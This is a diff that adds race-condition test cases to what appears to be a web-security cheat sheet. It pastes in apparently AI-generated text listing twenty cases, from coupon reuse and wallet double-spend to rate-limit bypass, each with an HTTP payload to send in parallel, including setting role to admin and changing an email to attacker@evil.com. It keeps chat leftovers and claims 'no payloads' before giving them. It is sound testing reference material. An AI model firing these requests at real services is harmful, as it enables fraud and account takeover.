@@ -9677,6 +9677,371 @@ window.location = redirectTo;
 - [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - Make exploiting race conditions in web applications highly efficient and ease-of-use.
 - [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - HTTP/2 Single Packet Attack low Level Library / Tool based on Scapy‌ + Exploit Timing Attacks
 
+Here are **ONLY the testcase names** from the **Race Condition Testcases + Real-Time Testing Payloads** you requested.
+No payloads included — only testcase names.
+
+---
+
+# ✅ **Race Condition Testcase Names (Names Only)**
+
+1. Concurrent Account Creation Race Test
+2. Password Reset Token Overwrite Race Test
+3. Coupon / Promo Code Reuse Race Test
+4. Wallet / Points Double-Spend Race Test
+5. Bank Transfer / Payment Double-Charge Test
+6. Inventory Stock Depletion Race Test
+7. Privilege Escalation via Profile Update Race Test
+8. Email Change Confirmation Race Test
+9. Rate-Limit Bypass Race Test
+10. Cart Price Manipulation Race Test
+11. Subscription Upgrade Race Condition Test
+12. File Upload Metadata Overwrite Race Test
+13. API Token Generation Race Test
+14. Transaction ID Collision Test
+15. Reservation / Booking System Double-Booking Test
+16. OAuth Code Reuse Race Test
+17. Checkout & Apply Coupon Simultaneous Race Test
+18. Update Balance & Transfer Balance Race Test
+19. Flag / Status Overwrite Race Test
+20. Concurrent Delete + Update Race Condition Test
+
+---
+
+If you want next:
+➡️ Same list **with payloads**
+➡️ **Turbo Intruder script** for race testing
+➡️ **JSON or CSV formatted** list
+
+Below is a **safe, defensive Race Condition (TOCTOU) Testing Guide** containing:
+
+✅ **Testcase names**
+✅ **Realistic, non-destructive testing payloads** (used by pentesters to detect race issues)
+⚠️ No harmful or irreversible actions.
+
+---
+
+# ✅ **Race Condition Testcases + Real-Time Testing Payloads**
+
+Race conditions are usually tested by **sending multiple parallel requests** with identical or conflicting payloads.
+
+---
+
+# 🔥 **1. Concurrent Account Creation Race Test**
+
+**Purpose:** Check if two accounts can be created with same email/username.
+
+**Payload (send simultaneously):**
+
+```
+POST /register
+{
+  "email": "victim@test.com",
+  "password": "Pass@123"
+}
+```
+
+---
+
+# 🔥 **2. Password Reset Token Overwrite Race Test**
+
+**Payload:**
+
+```
+POST /reset
+{
+  "email": "victim@test.com"
+}
+```
+
+Send request **20–50 times in parallel** and observe token duplication.
+
+---
+
+# 🔥 **3. Coupon / Promo Code Reuse Race Test**
+
+**Payload:**
+
+```
+POST /apply-coupon
+{
+  "coupon": "DISCOUNT100"
+}
+```
+
+Fire **100+ parallel requests**.
+
+---
+
+# 🔥 **4. Wallet / Points Double-Spend Race Test**
+
+**Payload:**
+
+```
+POST /wallet/transfer
+{
+  "amount": 100,
+  "to": "user123"
+}
+```
+
+Launch multiple parallel withdrawals before balance updates.
+
+---
+
+# 🔥 **5. Bank Transfer / Payment Double Charge Test**
+
+**Payload:**
+
+```
+POST /payment
+{
+  "amount": 50,
+  "method": "card"
+}
+```
+
+Send same payment multiple times to detect double-processing.
+
+---
+
+# 🔥 **6. Inventory Stock Depletion Race Test**
+
+**Payload:**
+
+```
+POST /order
+{
+  "item_id": "SKU123",
+  "quantity": 1
+}
+```
+
+Trigger 100 parallel requests when stock = 1.
+
+---
+
+# 🔥 **7. Privilege Escalation via Profile Update Race Test**
+
+**Payload:**
+
+```
+POST /user/update
+{
+  "role": "admin"
+}
+```
+
+Parallel requests to see if one bypasses validation.
+
+---
+
+# 🔥 **8. Email Change Confirmation Race Test**
+
+**Payload:**
+
+```
+POST /change-email
+{
+  "email": "attacker@evil.com"
+}
+```
+
+Check if multiple requests override the original email.
+
+---
+
+# 🔥 **9. Rate-Limit Bypass Race Test**
+
+**Payload:**
+
+```
+POST /login
+{
+  "username": "victim",
+  "password": "wrongpass"
+}
+```
+
+Send 50–200 parallel login attempts to bypass rate limits.
+
+---
+
+# 🔥 **10. Cart Price Manipulation Race Test**
+
+**Payload:**
+
+```
+POST /cart/update
+{
+  "price": 1
+}
+```
+
+Fire simultaneously with a normal checkout request.
+
+---
+
+# 🔥 **11. Subscription Upgrade Race Condition Test**
+
+**Payload:**
+
+```
+POST /plan/upgrade
+{
+  "plan": "premium"
+}
+```
+
+Parallel requests may cause free upgrade.
+
+---
+
+# 🔥 **12. File Upload Metadata Overwrite Race Test**
+
+**Payload:**
+
+```
+POST /upload
+Content-Disposition: form-data; name="file"; filename="test.png"
+```
+
+Send two uploads with same filename simultaneously.
+
+---
+
+# 🔥 **13. API Token Generation Race Test**
+
+**Payload:**
+
+```
+POST /api/token
+{
+  "device": "android"
+}
+```
+
+Check if duplicate tokens get issued.
+
+---
+
+# 🔥 **14. Transaction ID Collision Test**
+
+**Payload:**
+
+```
+POST /transaction
+{
+  "amount": 10
+}
+```
+
+Parallel POSTs may generate identical transaction IDs.
+
+---
+
+# 🔥 **15. Reservation / Booking System Double-Booking Test**
+
+**Payload:**
+
+```
+POST /reserve
+{
+  "slot": "2025-01-01T10:00"
+}
+```
+
+Multiple requests may book same slot.
+
+---
+
+# 🔥 **16. OAuth Code Reuse Race Test**
+
+**Payload:**
+
+```
+GET /oauth/callback?code=TEMP123
+```
+
+Ping endpoint multiple times to catch code re-use.
+
+---
+
+# 🔥 **17. Checkout & Apply Coupon Simultaneous Race Test**
+
+**Payload 1:**
+
+```
+POST /checkout
+```
+
+**Payload 2:**
+
+```
+POST /apply-coupon
+{
+  "coupon": "FREE100"
+}
+```
+
+Send both in parallel.
+
+---
+
+# 🔥 **18. Update Balance & Transfer Balance Race Test**
+
+**Payload 1 (credit):**
+
+```
+POST /wallet/add
+{
+  "amount": 100
+}
+```
+
+**Payload 2 (transfer):**
+
+```
+POST /wallet/transfer
+{
+  "amount": 100
+}
+```
+
+---
+
+# 🔥 **19. Flag / Status Overwrite Test**
+
+**Payload:**
+
+```
+POST /user/status
+{
+  "verified": true
+}
+```
+
+Simultaneous writes may override security check.
+
+---
+
+# 🔥 **20. Concurrent Delete + Update Race Condition Test**
+
+**Payload 1:**
+
+```
+DELETE /user/123
+```
+
+**Payload 2:**
+
+```
+POST /user/update
+{
+  "name": "test"
+}
+```
+
+---
 ## Methodology
 
 ### Limit-overrun
